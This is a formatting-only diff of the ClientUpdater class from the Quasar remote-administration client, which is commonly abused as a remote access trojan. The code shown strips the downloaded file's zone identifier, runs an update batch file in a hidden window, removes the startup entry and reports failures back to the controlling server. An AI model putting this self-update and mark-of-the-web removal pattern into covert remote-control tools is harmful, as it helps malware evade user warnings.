@@ -8,14 +8,10 @@ using System;
 using System.Diagnostics;
 using System.IO;
 
-namespace Quasar.Client.Installation
-{
-    public static class ClientUpdater
-    {
-        public static void Update(Networking.Client client, string newFilePath)
-        {
-            try
-            {
+namespace Quasar.Client.Installation {
+    public static class ClientUpdater {
+        public static void Update(Networking.Client client, string newFilePath) {
+            try {
                 FileHelper.DeleteZoneIdentifier(newFilePath);
 
                 var bytes = File.ReadAllBytes(newFilePath);
@@ -27,8 +23,7 @@ namespace Quasar.Client.Installation
                 if (string.IsNullOrEmpty(batchFile))
                     throw new Exception("Could not create update batch file.");
 
-                ProcessStartInfo startInfo = new ProcessStartInfo
-                {
+                ProcessStartInfo startInfo = new ProcessStartInfo {
                     WindowStyle = ProcessWindowStyle.Hidden,
                     UseShellExecute = true,
                     FileName = batchFile
@@ -39,11 +34,9 @@ namespace Quasar.Client.Installation
                     Startup.RemoveFromStartup();
 
                 Program.ConnectClient.Exit();
-            }
-            catch (Exception ex)
-            {
+            } catch (Exception ex) {
                 NativeMethods.DeleteFile(newFilePath);
-                client.Send(new SetStatus {Message = $"Update failed: {ex.Message}"});
+                client.Send(new SetStatus { Message = $"Update failed: {ex.Message}" });
             }
         }
     }
